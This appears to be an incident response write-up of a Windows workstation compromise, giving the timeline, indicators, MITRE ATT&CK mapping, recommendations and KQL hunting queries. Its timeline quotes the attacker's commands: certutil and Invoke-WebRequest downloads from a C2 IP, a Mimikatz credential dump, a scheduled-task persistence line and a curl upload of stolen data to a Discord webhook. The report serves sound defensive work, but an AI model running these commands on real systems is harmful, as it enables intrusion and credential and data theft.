# INCIDENT RESPONSE REPORT – Virtual Machine Compromise

**Report ID:** INC-2025-XXXX  

**Analyst:** Andre Poyser  

**Investigation Date:** 22-November-2025  

**Incident Date:** 19-November-2025  

---

## **EXECUTIVE SUMMARY**

Between **November 19, 2025 and November 20, 2025**, an attacker successfully gained unauthorized remote access to the workstation **azuki-sl** using compromised credentials belonging to *kenji.sato*. Shortly after the remote logon, the attacker executed a malicious PowerShell script (`wupdate.ps1`) downloaded from an external command-and-control (C2) server at **78.141.196.6**. The adversary rapidly performed credential dumping (using **mimikatz/mm.exe**), established persistence via a malicious scheduled task, staged stolen data in `C:\ProgramData\WindowsCache`, and exfiltrated the data to a Discord webhook endpoint. The attack concluded with the creation of a backdoor administrative account named **support**, and an attempted lateral movement to host **10.1.0.188**. Overall, the incident shows a **complete kill chain execution**, including initial access, execution, persistence, credential access, discovery, defense evasion, collection, exfiltration, and lateral movement.

**What Happened:**

**Impact Level:**  
- [ ] Low  
- [ ] Medium  
- [x] High  
- [ ] Critical  

**Status:**  
- [ ] Contained  
- [x] Eradicated  
- [ ] In Progress  

---

## **INCIDENT DETAILS**

### **Timeline**

- **First Malicious Activity:** `2025-11-19T18:36:18.503997Z` (UTC)  
- **Last Observed Activity:** `2025-11-19T19:10:42.057693Z` (UTC)  
- **Total Duration:** 34 minutes and 24 seconds  

### **Attack Overview**

- **Initial Access Method:**  
  RDP session from **88.97.178.12** using valid credentials  

- **Compromised Account:** `kenji.sato`  

- **Affected System:** `azuki-sl`  

- **Attacker IP Address:**  
  - **88.97.178.12** (Initial attack)  
  - **78.141.196.6** (C2)  

### **Attack Chain** *(What did the attacker do?)*

| Phase | Activity | MITRE TTP |
| --- | --- | --- |
| **Initial Access** | RDP login using stolen credentials | **T1078 – Valid Accounts** |
| **Execution** | PowerShell download & execution of `wupdate.ps1` | **T1059.001 – PowerShell** |
| **Persistence** | Malicious scheduled task | **T1053.005 – Scheduled Task** |
| **Privilege Escalation** | Debug privilege in Mimikatz | **T1068 / T1134** |
| **Defense Evasion** | Adding Defender exclusions | **T1562.001 – Impair Defenses** |
| **Credential Access** | Mimikatz (`sekurlsa::logonpasswords`) | **T1003.001 – LSASS Memory Dump** |
| **Discovery** | ARP scan, system enumeration | **T1046 / T1016** |
| **Collection** | `export-data.zip` created | **T1560 – Archive Collected Data** |
| **Exfiltration** | Data sent via Discord webhook | **T1567.002 – Exfiltration to Web Service** |
| **Command-and-Control** | C2 over HTTPS | **T1071.001 – Web Protocol** |
| **Lateral Movement** | RDP to `10.1.0.188` | **T1021.001 – RDP** |
| **Impact** | Creation of malicious admin account | **T1098 – Account Manipulation** |

---

## **Key Findings (IOCs)**

### **Malicious Files**

- `wupdate.ps1`  
- `mm.exe` (Mimikatz)  
- `svchost.exe` (malicious, located in `C:\ProgramData\WindowsCache`)  
- `export-data.zip`  

### **Malicious IPs**

- **78.141.196.6** (payload & C2)  
- **88.97.178.12** (initial access)  

### **Persistence Mechanisms**

- Scheduled task **"Windows Update Check"**  
- Malicious binary `svchost.exe` in `C:\ProgramData\WindowsCache` (suspicious location for scheduled tasks)  

### **Backdoor**

- User account: **support**  
- Added to **Administrators**  

---

## **RECOMMENDATIONS**

### **Immediate Actions** *(Do Now)*

#### **Immediate Containment**

1. Isolate affected host **azuki-sl** from the network.  
2. Block IPs **78.141.196.6** and **88.97.178.12** at the firewall.  
3. Disable/delete the **support** account.  

#### **Eradication**

1. Remove malicious scheduled task and delete `C:\ProgramData\WindowsCache\` contents.  
2. Reimage affected system or conduct deep forensic review.  
3. Reset credentials for all accounts active during the compromise window.  
4. Remove Defender exclusions added during the attack.  

#### **Recovery**

1. Restore system from known-good backups.  

### **Long-term** *(Security Improvements)*

#### **Hardening**

1. Enforce MFA for all remote logons.  
2. Disable direct RDP from the internet.  
3. Enable ASR rules for credential theft blocking.  
4. Enable PowerShell logging (Script Block, Module, Transcription).  
5. Enforce Defender real-time protection and block adding exclusions via GPO.  

---

## **APPENDIX**

### **A. Key Indicators of Compromise (IOCs)**

| Type | Value | Description |
| --- | --- | --- |
| IP Address | `88.97.178.12` | Initial RDP connection established |
| File | `mm.exe` (Mimikatz) | Popular hacking tool for credential exfiltration |
| Account | `kenji.sato` | User account |
| Domain | N/A | N/A |
| Hash | `61c0810a23580cf492a6ba4f7654566108331e7a4134c968c2d6a05261b2d8a1` | Known hash for Mimikatz flagged by VirusTotal |

### **B. MITRE ATT&CK Mapping**

| Tactic | Technique ID | Evidence | Flag # |
| --- | --- | --- | --- |
| **Initial Access** | **T1078 – Valid Accounts** | RDP login using stolen credentials; RDP connection to device `azuki-sl`, RemoteIP `88.97.178.12` on port 0 (`2025-11-19T18:36:18.503997Z`) | 1 & 2 |
| **Execution** | **T1059.001 – PowerShell** | PowerShell download & execution of `wupdate.ps1` (`2025-11-19T19:05:30.755805Z`); Mimikatz downloaded using `certutil` | 4, 7 & 18 |
| **Persistence** | **T1053.005 – Scheduled Task** | Malicious scheduled task **"Windows Update Check"** created in the `C:\ProgramData\WindowsCache` folder (suspicious location for update tasks) | 9 |
| **Privilege Escalation** | **T1068 / T1134** | `2025-11-19T19:08:26.2804285Z`: command `"mm.exe" privilege::debug sekurlsa::logonpasswords exit` | 13 |
| **Defense Evasion** | **T1562.001 – Impair Defenses** | 3 file extensions were modified for evasion; `C:\Users\KENJI~1.SAT\AppData\Local\Temp` was modified | 5, 6 & 7 |
| **Credential Access** | **T1003.001 – LSASS Memory Dump** | `2025-11-19T19:08:26.2804285Z`: Mimikatz command `"mm.exe" privilege::debug sekurlsa::logonpasswords exit` executed | 12 |
| **Discovery** | **T1046 / T1016** | `2025-11-19T19:04:01.773778Z`: `ARP.EXE -a` command executed | 3 |
| **Collection** | **T1560 – Archive Collected Data** | `2025-11-19T19:08:58.0244963Z`: `export-data.zip` created | 14 |
| **Exfiltration** | **T1567.002 – Exfiltration to Web Service** | `2025-11-19T19:09:21.4234133Z`: Data sent via Discord webhook using `curl.exe -F file=@C:\ProgramData\WindowsCache\export-data.zip https://discord.com/api/webhooks/...` | 15 |
| **Command-and-Control** | **T1071.001 – Web Protocol** | C2 over HTTPS – IP `78.141.196.6` | 10 |
| **Lateral Movement** | **T1021.001 – RDP** | `2025-11-19T19:10:42.057693Z`: RDP connection to `10.1.0.188` | 19 & 20 |
| **Impact** | **T1098 – Account Manipulation** | `2025-11-19T19:09:48.8977132Z`: Creation of malicious admin account `support` | 17 |

### **C. Investigation Timeline**

| Time (UTC) | Event | Evidence Source |
| --- | --- | --- |
| `2025-11-19T18:36:18.503997Z` | Suspicious Remote Logon (**Initial Access**) | User: `kenji.sato`, Remote IP: `88.97.178.12`, Remote port reported as `0` (highly abnormal for RDP). |
| `2025-11-19T18:37:26.3725923Z` | Initial Command-and-Control Activity | PowerShell successfully connected to `78.141.196.6:443` (C2 server). Communication via encrypted HTTPS. |
| `2025-11-19T18:37:40.3177136Z` | Malicious PowerShell Execution | Script downloaded: `Invoke-WebRequest http://78.141.196.6:8080/wupdate.ps1`; dropped into `C:\Users\KENJI~1.SAT\AppData\Local\Temp\wupdate.ps1`. |
| `2025-11-19T19:04:01.773778Z` | Internal Reconnaissance | ARP scan executed from the compromised host: `ARP.EXE -a`. |
| `2025-11-19T19:05:30.755805Z` | Staging Directory Created | File created in `C:\ProgramData\WindowsCache`. Initiated by malicious script: `powershell.exe -ExecutionPolicy Bypass -File wupdate.ps1`. |
| `2025-11-19T19:07:21.0804181Z` | Malware Downloaded via CertUtil (Defense Evasion) | Command: `certutil.exe -urlcache -f http://78.141.196.6:8080/AdobeGC.exe C:\ProgramData\WindowsCache\mm.exe`. File `mm.exe` later confirmed as **Mimikatz**. |
| `2025-11-19T19:07:46.9796512Z` | Persistence Established | Scheduled task created: `schtasks.exe /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00`. |
| `2025-11-19T19:08:26.2804285Z` | Credential Dumping | Mimikatz command executed: `"mm.exe" privilege::debug sekurlsa::logonpasswords exit`. |
| `2025-11-19T19:08:58.0244963Z` | Data Collection | Zip archive created for exfiltration: `export-data.zip`. |
| `2025-11-19T19:09:21.4234133Z` | Exfiltration via Discord Webhook | Command: `curl.exe -F file=@export-data.zip https://discord.com/api/webhooks/...`. |
| `2025-11-19T19:10:42.057693Z` | Lateral Movement Attempt | Successful RDP connection to internal host `10.1.0.188`. |

### **D. Evidence – KQL Queries & Screenshots**

**Query 1 – Initial Access:**

```sql
DeviceLogonEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName == "azuki-sl"
| where AccountName == "kenji.sato"

```
<img width="1088" height="658" alt="image" src="https://github.com/user-attachments/assets/9a6e3725-190f-4037-aa65-49133307a46b" />

**Query 2 - Malicious Execution / Initial Command and Control:**
```sql
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ActionType == "ConnectionSuccess"
| where RemoteIPType == "Public" or "IsExternal" == true
| where InitiatingProcessCommandLine contains "powershell.exe"
```
**Results: C2 IP: 78.141.196.6

<img width="1140" height="738" alt="image" src="https://github.com/user-attachments/assets/51ad81a0-fe57-4eb3-974c-c07d47cf1dfa" />
